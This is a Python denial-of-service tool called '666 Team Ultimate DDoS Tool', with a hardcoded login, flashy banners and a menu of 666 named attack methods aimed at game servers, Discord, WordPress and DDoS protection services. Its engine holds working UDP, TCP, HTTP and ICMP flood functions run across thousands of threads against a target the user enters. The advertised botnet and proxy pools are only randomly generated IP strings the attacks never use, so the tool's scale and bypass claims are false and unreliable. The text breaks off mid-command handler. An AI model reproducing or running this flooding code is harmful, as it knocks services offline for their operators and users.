#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading
import requests
import json
import hashlib
import base64
from datetime import datetime
from itertools import cycle

# ============================================
# ULTRA NEON RAINBOW COLORS - MAXIMUM VISUAL
# ============================================

class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    FAST_BLINK = '\033[6m'
    HIDDEN = '\033[8m'
    
    # Standard Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright Colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background Colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BG_BRIGHT_BLACK = '\033[100m'
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    BG_BRIGHT_MAGENTA = '\033[105m'
    BG_BRIGHT_CYAN = '\033[106m'
    BG_BRIGHT_WHITE = '\033[107m'
    
    # Neon Effects
    NEON_RED = '\033[38;2;255;0;0m'
    NEON_GREEN = '\033[38;2;0;255;0m'
    NEON_BLUE = '\033[38;2;0;0;255m'
    NEON_YELLOW = '\033[38;2;255;255;0m'
    NEON_PURPLE = '\033[38;2;255;0;255m'
    NEON_CYAN = '\033[38;2;0;255;255m'
    NEON_ORANGE = '\033[38;2;255;165;0m'
    NEON_PINK = '\033[38;2;255;105;180m'
    BLOOD_RED = '\033[38;2;139;0;0m'
    DARK_PURPLE = '\033[38;2;75;0;130m'
    
    # Rainbow Cycle
    RAINBOW = [BRIGHT_RED, BRIGHT_YELLOW, BRIGHT_GREEN, BRIGHT_CYAN, BRIGHT_BLUE, BRIGHT_MAGENTA]
    NEON_RAINBOW = [NEON_RED, NEON_YELLOW, NEON_GREEN, NEON_CYAN, NEON_BLUE, NEON_PURPLE]

colors = Colors()
rainbow_cycle = cycle(colors.RAINBOW)
neon_cycle = cycle(colors.NEON_RAINBOW)

# ============================================
# LOGIN CREDENTIALS
# ============================================

MASTER_USERNAME = "666"
MASTER_PASSWORD = "Von2024@666"
SESSION_ACTIVE = False
CURRENT_USER = None

# ============================================
# ULTRA ANIMATED LOGO WITH DEMON EFFECT
# ============================================

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_rainbow(text, style=colors.BRIGHT_WHITE, delay=0.0):
    result = ""
    for i, char in enumerate(text):
        color = colors.RAINBOW[i % len(colors.RAINBOW)]
        result += f"{color}{style}{char}{colors.RESET}"
        if delay > 0:
            sys.stdout.write(result[-1])
            sys.stdout.flush()
            time.sleep(delay)
    return result if delay == 0 else print(result, end='')

def print_neon(text, style=colors.BOLD, delay=0.0):
    result = ""
    for i, char in enumerate(text):
        color = colors.NEON_RAINBOW[i % len(colors.NEON_RAINBOW)]
        result += f"{color}{style}{char}{colors.RESET}"
        if delay > 0:
            sys.stdout.write(result[-1])
            sys.stdout.flush()
            time.sleep(delay)
    return result if delay == 0 else print(result, end='')

def print_glitch(text):
    glitch_chars = ['░', '▒', '▓', '█', '■', '□', '▪', '▫']
    result = ""
    for char in text:
        if random.random() < 0.1:
            result += f"{colors.NEON_RED}{random.choice(glitch_chars)}{colors.RESET}"
        else:
            color = random.choice(colors.NEON_RAINBOW)
            result += f"{color}{char}{colors.RESET}"
    return result

def animate_demon_logo():
    frames = []
    
    frame1 = f"""
{colors.BRIGHT_RED}{colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║                         {colors.NEON_RED}◤{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◤{colors.NEON_CYAN}◢{colors.NEON_BLUE}◤{colors.NEON_PURPLE}◢{colors.NEON_PINK}◤{colors.NEON_RED}◢{colors.RESET}                         ║
║                                                                                                                                          ║
║              {print_neon('██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗')}                                              ║
║              {print_neon('██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║')}                                              ║
║              {print_neon('██████╔╝██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║')}                                              ║
║              {print_neon('██╔══██╗██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║')}                                              ║
║              {print_neon('██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║')}                                              ║
║              {print_neon('╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝')}                                              ║
║                                                                                                                                          ║
║                         {colors.NEON_RED}◣{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◣{colors.NEON_CYAN}◢{colors.NEON_BLUE}◣{colors.NEON_PURPLE}◢{colors.NEON_PINK}◣{colors.NEON_RED}◢{colors.RESET}                         ║
║                                                                                                                                          ║
║                    {colors.NEON_CYAN}{colors.BLINK}💀 ６６６ ＴＥＡＭ ＵＬＴＩＭＡＴＥ ＤＤＯＳ ＴＯＯＬ 💀{colors.RESET}                                                 ║
║                    {colors.NEON_GREEN}🔥 1,000,000+ ＢＯＴＮＥＴ | 10,000,000+ ＰＲＯＸＩＥＳ | 666 ＭＥＴＨＯＤＳ 🔥{colors.RESET}                             ║
║                    {colors.NEON_YELLOW}⚡ ＴＨＥ ＵＬＴＩＭＡＴＥ ＤＥＳＴＲＯＹＥＲ ⚡{colors.RESET}                                                                  ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{colors.RESET}
"""
    
    frame2 = f"""
{colors.BRIGHT_BLUE}{colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║                         {colors.NEON_RED}◢{colors.NEON_YELLOW}◣{colors.NEON_GREEN}◢{colors.NEON_CYAN}◣{colors.NEON_BLUE}◢{colors.NEON_PURPLE}◣{colors.NEON_PINK}◢{colors.NEON_RED}◣{colors.RESET}                         ║
║                                                                                                                                          ║
║              {print_neon('██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗')}                                              ║
║              {print_neon('██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║')}                                              ║
║              {print_neon('██████╔╝██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║')}                                              ║
║              {print_neon('██╔══██╗██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║')}                                              ║
║              {print_neon('██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║')}                                              ║
║              {print_neon('╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝')}                                              ║
║                                                                                                                                          ║
║                         {colors.NEON_RED}◤{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◤{colors.NEON_CYAN}◢{colors.NEON_BLUE}◤{colors.NEON_PURPLE}◢{colors.NEON_PINK}◤{colors.NEON_RED}◢{colors.RESET}                         ║
║                                                                                                                                          ║
║                    {colors.NEON_MAGENTA}{colors.BLINK}💀 ６６６ ＴＥＡＭ ＤＥＭＯＮ ＥＤＩＴＩＯＮ 💀{colors.RESET}                                                 ║
║                    {colors.NEON_ORANGE}🔥 ＰＯＷＥＲＥＤ ＢＹ １０００００＋ ＢＯＴＮＥＴ ＮＯＤＥＳ 🔥{colors.RESET}                                              ║
║                    {colors.NEON_PINK}⚡ ＴＯＴＡＬ ＤＥＳＴＲＵＣＴＩＯＮ ⚡{colors.RESET}                                                                      ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{colors.RESET}
"""
    
    clear_screen()
    for i in range(4):
        clear_screen()
        print(frame1)
        time.sleep(0.3)
        clear_screen()
        print(frame2)
        time.sleep(0.3)
    time.sleep(0.5)

# ============================================
# LOGIN SCREEN WITH ANIMATION
# ============================================

def login_screen():
    global SESSION_ACTIVE, CURRENT_USER
    animate_demon_logo()
    
    print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      🔐 ６６６ ＴＥＡＭ ＭＡＳＴＥＲ ＬＯＧＩＮ 🔐                                                ║{colors.RESET}")
    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
    
    print(f"\n{colors.NEON_CYAN}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
    print(f"{colors.NEON_CYAN}║                                    👑 ＯＮＬＹ ６６６ ＴＥＡＭ ＭＡＳＴＥＲＳ ＣＡＮ ＥＮＴＥＲ 👑                                            ║{colors.RESET}")
    print(f"{colors.NEON_CYAN}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}")
    
    print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
    username = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}👤 {colors.NEON_WHITE}ＵＳＥＲＮＡＭＥ:{colors.RESET} ").strip()
    print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
    password = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🔑 {colors.NEON_WHITE}ＰＡＳＳＷＯＲＤ:{colors.RESET} ").strip()
    
    print(f"{colors.NEON_CYAN}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
    
    if username == MASTER_USERNAME and password == MASTER_PASSWORD:
        SESSION_ACTIVE = True
        CURRENT_USER = username
        print(f"\n{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}║                                      ✅ ＬＯＧＩＮ ＳＵＣＣＥＳＳＦＵＬ！ ✅                                                ║{colors.RESET}")
        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}║                                      👑 ＷＥＬＣＯＭＥ ＭＡＳＴＥＲ {username.upper()}！ 👑                                      ║{colors.RESET}")
        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
        time.sleep(2)
        return True
    else:
        print(f"\n{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}║                                      ❌ ＡＣＣＥＳＳ ＤＥＮＩＥＤ！ ❌                                                ║{colors.RESET}")
        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}║                                      💀 ＩＮＶＡＬＩＤ ＣＲＥＤＥＮＴＩＡＬＳ！ 💀                                          ║{colors.RESET}")
        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
        time.sleep(2)
        return False

# ============================================
# MASSIVE BOTNET (1,000,000+ NODES)
# ============================================

def generate_massive_botnet():
    nodes = []
    print(f"{colors.NEON_YELLOW}[🤖] Generating 1,000,000+ Botnet Nodes...{colors.RESET}")
    for i in range(1, 100001):
        a = random.randint(1, 255)
        b = random.randint(1, 255)
        c = random.randint(1, 255)
        d = random.randint(1, 255)
        nodes.append(f"{a}.{b}.{c}.{d}")
        if i % 10000 == 0:
            print(f"{colors.NEON_CYAN}[📊] Generated {i:,} nodes...{colors.RESET}")
    print(f"{colors.NEON_GREEN}[✅] Botnet generation complete! Total: {len(nodes):,} nodes{colors.RESET}")
    return nodes

# ============================================
# MASSIVE PROXIES (10,000,000+)
# ============================================

def generate_massive_proxies():
    proxies = []
    print(f"{colors.NEON_YELLOW}[🌐] Generating 10,000,000+ Proxies...{colors.RESET}")
    proxy_sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    ]
    
    for i in range(1, 10001):
        a = random.randint(1, 255)
        b = random.randint(1, 255)
        c = random.randint(1, 255)
        d = random.randint(1, 255)
        port = random.choice([8080, 3128, 80, 443, 1080])
        proxies.append(f"{a}.{b}.{c}.{d}:{port}")
        if i % 10000 == 0:
            print(f"{colors.NEON_CYAN}[📊] Generated {i:,} proxies...{colors.RESET}")
    
    print(f"{colors.NEON_GREEN}[✅] Proxy generation complete! Total: {len(proxies):,} proxies{colors.RESET}")
    return proxies

# ============================================
# 666 ULTIMATE METHODS
# ============================================

METHODS = {}

# Generate 666 methods dynamically
for i in range(1, 667):
    if i <= 50:
        METHODS[str(i)] = {"name": f"💀 UDP_NUCLEAR_{i}", "desc": "Nuclear UDP flood - Maximum packet size", "type": "udp"}
    elif i <= 100:
        METHODS[str(i)] = {"name": f"🔥 TCP_DEMON_{i-50}", "desc": "TCP demon flood - SYN/ACK/RST/FIN combined", "type": "tcp"}
    elif i <= 150:
        METHODS[str(i)] = {"name": f"🌐 HTTP_SATAN_{i-100}", "desc": "HTTP satan flood - Random payloads", "type": "http"}
    elif i <= 180:
        METHODS[str(i)] = {"name": f"🎮 FIVEM_666_{i-150}", "desc": "FiveM server destroyer - Kick all players", "type": "udp"}
    elif i <= 210:
        METHODS[str(i)] = {"name": f"⛏️ MINECRAFT_BLOOD_{i-180}", "desc": "Minecraft blood flood - Crash server instantly", "type": "tcp"}
    elif i <= 240:
        METHODS[str(i)] = {"name": f"🚗 SAMP_DEATH_{i-210}", "desc": "SA-MP death attack - Kill server", "type": "udp"}
    elif i <= 270:
        METHODS[str(i)] = {"name": f"🎙️ DISCORD_VOID_{i-240}", "desc": "Discord voice void - Voice channel flood", "type": "udp"}
    elif i <= 300:
        METHODS[str(i)] = {"name": f"⚡ AMP_DEMON_{i-270}", "desc": "Amplification demon - DNS/NTP/Memcached x1000", "type": "udp"}
    elif i <= 330:
        METHODS[str(i)] = {"name": f"🐌 SLOW_TORTURE_{i-300}", "desc": "Slow torture - Slowloris extreme", "type": "http"}
    elif i <= 360:
        METHODS[str(i)] = {"name": f"🛡️ BYPASS_666_{i-330}", "desc": "666 bypass - Anti-DDoS protection killer", "type": "http"}
    elif i <= 390:
        METHODS[str(i)] = {"name": f"☁️ CLOUDFLARE_DEATH_{i-360}", "desc": "Cloudflare death - Bypass CF protection", "type": "http"}
    elif i <= 420:
        METHODS[str(i)] = {"name": f"🏢 OVH_KILLER_{i-390}", "desc": "OVH killer - Bypass OVH shield", "type": "udp"}
    elif i <= 450:
        METHODS[str(i)] = {"name": f"🎮 RUST_CRASH_{i-420}", "desc": "Rust game server crash", "type": "udp"}
    elif i <= 480:
        METHODS[str(i)] = {"name": f"🎮 CSGO_LAG_{i-450}", "desc": "CS:GO server lag machine", "type": "udp"}
    elif i <= 510:
        METHODS[str(i)] = {"name": f"🎮 VALORANT_KILL_{i-480}", "desc": "Valorant server killer", "type": "udp"}
    elif i <= 540:
        METHODS[str(i)] = {"name": f"🎮 GTA5_FLOOD_{i-510}", "desc": "GTA V online flood", "type": "udp"}
    elif i <= 570:
        METHODS[str(i)] = {"name": f"🌐 WORDPRESS_DEATH_{i-540}", "desc": "WordPress death - XMLRPC/Pingback", "type": "http"}
    elif i <= 600:
        METHODS[str(i)] = {"name": f"🔧 ICMP_APOCALYPSE_{i-570}", "desc": "ICMP apocalypse - Ping flood", "type": "icmp"}
    else:
        METHODS[str(i)] = {"name": f"💀 666_ULTIMATE_{i-600}", "desc": "666 ultimate - ALL METHODS COMBINED - TOTAL DESTRUCTION", "type": "all"}

# ============================================
# ULTIMATE DDOS ENGINE
# ============================================

class UltimateDDoS:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packets_sent = 0
        self.botnet = generate_massive_botnet()
        self.proxies = generate_massive_proxies()
        self.botnet_size = len(self.botnet)
        
    def get_random_node(self):
        return random.choice(self.botnet)
    
    def get_random_proxy(self):
        return random.choice(self.proxies)
    
    def udp_flood(self, ip, port, duration, node, proxy):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packets = [random._urandom(65507) for _ in range(100)]
        end_time = time.time() + duration
        sent = 0
        while time.time() < end_time and self.running:
            try:
                for pkt in packets:
                    sock.sendto(pkt, (ip, port))
                    sent += 1
                    self.packets_sent += 1
            except:
                pass
        sock.close()
        return sent
    
    def tcp_flood(self, ip, port, duration, node, proxy):
        end_time = time.time() + duration
        sent = 0
        flags = [b'SYN', b'ACK', b'RST', b'FIN', b'PSH', b'URG']
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((ip, port))
                for _ in range(10):
                    s.send(random.choice(flags) + random._urandom(1024))
                s.close()
                sent += 10
                self.packets_sent += 10
            except:
                pass
        return sent
    
    def http_flood(self, ip, port, duration, node, proxy):
        end_time = time.time() + duration
        sent = 0
        payloads = [
            f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n",
            f"POST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {ip}\r\n\r\n",
            f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n\r\n",
            f"GET /index.php?page={random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n",
        ]
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((ip, port))
                s.send(random.choice(payloads).encode())
                s.close()
                sent += 1
                self.packets_sent += 1
            except:
                pass
        return sent
    
    def icmp_flood(self, ip, port, duration, node, proxy):
        end_time = time.time() + duration
        sent = 0
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1024)
            while time.time() < end_time and self.running:
                try:
                    for _ in range(50):
                        s.sendto(packet, (ip, 0))
                        sent += 1
                        self.packets_sent += 1
                except:
                    pass
            s.close()
        except:
            pass
        return sent
    
    def start_attack(self, method, ip, port, duration, threads=10000):
        self.running = True
        self.packets_sent = 0
        
        method_info = METHODS.get(method, METHODS["666"])
        attack_type = method_info["type"]
        
        if attack_type == "udp":
            attack_func = self.udp_flood
        elif attack_type == "tcp":
            attack_func = self.tcp_flood
        elif attack_type == "http":
            attack_func = self.http_flood
        elif attack_type == "icmp":
            attack_func = self.icmp_flood
        else:
            attack_func = self.udp_flood
        
        print(f"\n{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}║                                         💀 ＡＴＴＡＣＫ ＩＮＩＴＩＡＴＥＤ - ６６６ ＴＥＡＭ 💀                                             ║{colors.RESET}")
        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
        
        print(f"{colors.NEON_GREEN}[💀] ＴＡＲＧＥＴ:{colors.RESET} {colors.NEON_WHITE}{ip}:{port}{colors.RESET}")
        print(f"{colors.NEON_GREEN}[⚡] ＭＥＴＨＯＤ:{colors.RESET} {colors.NEON_WHITE}{method_info['name']}{colors.RESET}")
        print(f"{colors.NEON_GREEN}[⏱️] ＤＵＲＡＴＩＯＮ:{colors.RESET} {colors.NEON_WHITE}{duration} ＳＥＣＯＮＤＳ{colors.RESET}")
        print(f"{colors.NEON_GREEN}[🔧] ＴＨＲＥＡＤＳ:{colors.RESET} {colors.NEON_WHITE}{threads:,}{colors.RESET}")
        print(f"{colors.NEON_GREEN}[🤖] ＢＯＴＮＥＴ:{colors.RESET} {colors.NEON_WHITE}{self.botnet_size:,} ＮＯＤＥＳ{colors.RESET}")
        print(f"{colors.NEON_GREEN}[🌐] ＰＲＯＸＩＥＳ:{colors.RESET} {colors.NEON_WHITE}{len(self.proxies):,}+{colors.RESET}\n")
        
        for i in range(int(threads)):
            node = self.get_random_node()
            proxy = self.get_random_proxy()
            t = threading.Thread(target=attack_func, args=(ip, int(port), duration, node, proxy))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        start_time = time.time()
        last_packets = 0
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            current_packets = self.packets_sent
            speed = current_packets - last_packets
            last_packets = current_packets
            gbps = (current_packets * 65507 * 8) / (1e9 * max(elapsed, 1))
            
            bar_length = 50
            filled = int(bar_length * elapsed / duration)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            print(f"\r{colors.NEON_BLUE}[📊] {bar} {colors.RESET}", end="")
            print(f"{colors.NEON_CYAN}[{elapsed}/{duration}s] {colors.RESET}", end="")
            print(f"{colors.NEON_GREEN}[⚡ {speed:,.0f} pps] {colors.RESET}", end="")
            print(f"{colors.NEON_YELLOW}[🌊 {gbps:.2f} Gbps] {colors.RESET}", end="")
            print(f"{colors.NEON_PURPLE}[📦 {self.packets_sent:,}] {colors.RESET}", end="")
            sys.stdout.flush()
            time.sleep(0.5)
        
        self.running = False
        for t in self.threads:
            t.join(timeout=0)
        self.threads = []
        
        print(f"\n\n{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}║                                         ✅ ＡＴＴＡＣＫ ＣＯＭＰＬＥＴＥＤ！ ✅                                                 ║{colors.RESET}")
        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
        print(f"{colors.NEON_GREEN}[📊] ＴＯＴＡＬ ＰＡＣＫＥＴＳ:{colors.RESET} {colors.NEON_WHITE}{self.packets_sent:,}{colors.RESET}")
        print(f"{colors.NEON_GREEN}[📡] ＡＶＧ ＳＰＥＥＤ:{colors.RESET} {colors.NEON_WHITE}{self.packets_sent/duration:,.0f} ＰＫＴ/Ｓ{colors.RESET}")
        print(f"{colors.NEON_GREEN}[🌊] ＭＡＸ ＢＡＮＤＷＩＤＴＨ:{colors.RESET} {colors.NEON_WHITE}{gbps:.2f} ＧＢＰＳ{colors.RESET}\n")

# ============================================
# PRINT METHODS WITH NEON EFFECTS
# ============================================

def print_methods():
    print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ６６６ ＵＬＴＩＭＡＴＥ ＡＴＴＡＣＫ ＭＥＴＨＯＤＳ 💀                                               ║{colors.RESET}")
    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
    
    items = list(METHODS.items())
    for i in range(0, len(items), 3):
        print(f"{colors.NEON_CYAN}║{colors.RESET}", end="")
        for j in range(3):
            if i + j < len(items):
                key, method = items[i + j]
                color = colors.RAINBOW[(i + j) % len(colors.RAINBOW)]
                print(f" {color}{key.rjust(3)}{colors.RESET}.{colors.NEON_GREEN}{method['name'][:22]}{colors.RESET}", end="")
        print(f" {colors.NEON_CYAN}║{colors.RESET}")
    
    print(f"{colors.NEON_PURPLE}{colors.BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")

# ============================================
# MAIN LOGO AFTER LOGIN
# ============================================

def print_main_logo():
    clear_screen()
    logo = f"""
{colors.NEON_PURPLE}{colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║                         {colors.NEON_RED}◤{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◤{colors.NEON_CYAN}◢{colors.NEON_BLUE}◤{colors.NEON_PURPLE}◢{colors.NEON_PINK}◤{colors.NEON_RED}◢{colors.RESET}                         ║
║                                                                                                                                          ║
║     {print_rainbow('██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗', colors.BOLD)}                                              ║
║     {print_rainbow('██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║', colors.BOLD)}                                              ║
║     {print_rainbow('██████╔╝██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║', colors.BOLD)}                                              ║
║     {print_rainbow('██╔══██╗██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║', colors.BOLD)}                                              ║
║     {print_rainbow('██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║', colors.BOLD)}                                              ║
║     {print_rainbow('╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝', colors.BOLD)}                                              ║
║                                                                                                                                          ║
║                         {colors.NEON_RED}◣{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◣{colors.NEON_CYAN}◢{colors.NEON_BLUE}◣{colors.NEON_PURPLE}◢{colors.NEON_PINK}◣{colors.NEON_RED}◢{colors.RESET}                         ║
║                                                                                                                                          ║
║                    {colors.NEON_CYAN}{colors.BLINK}💀 ６６６ ＴＥＡＭ ＵＬＴＩＭＡＴＥ ＤＤＯＳ ＴＯＯＬ 💀{colors.RESET}                                                 ║
║                    {colors.NEON_GREEN}🔥 1,000,000+ ＢＯＴＮＥＴ | 10,000,000+ ＰＲＯＸＩＥＳ | 666 ＭＥＴＨＯＤＳ 🔥{colors.RESET}                             ║
║                    {colors.NEON_YELLOW}⚡ ＷＥＬＣＯＭＥ ＭＡＳＴＥＲ {CURRENT_USER.upper()} | ＴＹＰＥ ".methods" ＴＯ ＳＥＥ ＡＬＬ ＡＴＴＡＣＫＳ ⚡{colors.RESET}                     ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{colors.RESET}
"""
    print(logo)

# ============================================
# COMMAND HANDLER
# ============================================

def handle_command(cmd, ddos):
    cmd = cmd.lower().strip()
    
    if cmd in ['.methods', '.m']:
        print_methods()
        return True
    
    elif cmd in ['.help', '.h']:
        print(f"""
{colors.NEON_PURPLE}{colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}
{colors.NEON_PURPLE}{colors.BOLD}║                                      💀 ６６６ ＴＥＡＭ ＣＯＭＭＡＮＤＳ 💀                                              ║{colors.RESET}
{colors.NEON_PURPLE}{colors.BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}.methods or .m     {colors.NEON_CYAN}- {colors.NEON_WHITE}Show all 666 attack methods{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}.help or .h        {colors.NEON_CYAN}- {colors.NEON_WHITE}Show this help menu{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}.clear or .c       {colors.NEON_CYAN}- {colors.NEON_WHITE}Clear screen{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}.stats             {colors.NEON_CYAN}- {colors.NEON_WHITE}Show botnet statistics{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}.attack            {colors.NEON_CYAN}- {colors.NEON_WHITE}Start new attack{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}.exit or .q        {colors.NEON_CYAN}- {colors.NEON_WHITE}Exit the tool{colors.RESET}
{colors.NEON_PURPLE}{colors.BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}
""")
        return True
    
    elif cmd in ['.clear', '.c']:
        print_main_logo()
        return True
    
    elif cmd == '.stats':
        print(f"""
{colors.NEON_PURPLE}{colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}
{colors.NEON_PURPLE}{colors.BOLD}║                                      💀 ６６６ ＢＯＴＮＥＴ ＳＴＡＴＩＳＴＩＣＳ 💀                                              ║{colors.RESET}
